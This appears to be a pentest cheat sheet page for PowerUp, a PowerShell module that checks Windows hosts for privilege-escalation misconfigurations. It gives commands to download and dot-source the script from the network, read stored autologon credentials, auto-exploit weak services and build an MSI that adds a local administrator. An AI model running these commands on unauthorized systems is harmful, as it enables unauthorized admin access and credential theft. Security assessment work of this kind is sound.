# 03.25 PowerUp

> PowerShell privilege-escalation audit module — finds misconfigurations on Windows hosts.

## Overview

PowerUp (part of PowerSploit) audits a Windows host for common privesc vectors: services running as SYSTEM with weak ACLs, unquoted service paths, weak registry permissions on services, AlwaysInstallElevated, schtasks misconfigs, dll hijack opportunities, application shim issues. Returns Invoke-AllChecks output highlighting actionable findings. Local-only; not for AD-wide enumeration.

## Steps

- **Step 1** - Dot-source PowerUp.ps1.
- **Step 2** - Run Invoke-AllChecks for full audit.
- **Step 3** - Use specific functions for targeted exploitation.

## Commands

### Get + load

```powershell
iwr 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1' -OutFile PowerUp.ps1
. .\PowerUp.ps1
```

### Run all checks

```powershell
Invoke-AllChecks
```

### Service-related checks

```powershell
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
Install-ServiceBinary -Name '<VULN-SERVICE>'                  # auto-exploit
```

### Registry checks

```powershell
Get-RegistryAlwaysInstallElevated     # MSI install elevation
Get-RegistryAutoLogon                  # stored autologon creds
```

### Add admin to local Administrators (if SYSTEM context)

```powershell
Add-ServiceDacl  # add DACL bits
Write-UserAddMSI                   # writes UserAddNew.msi to %TEMP%, ready to execute with AlwaysInstallElevated
```
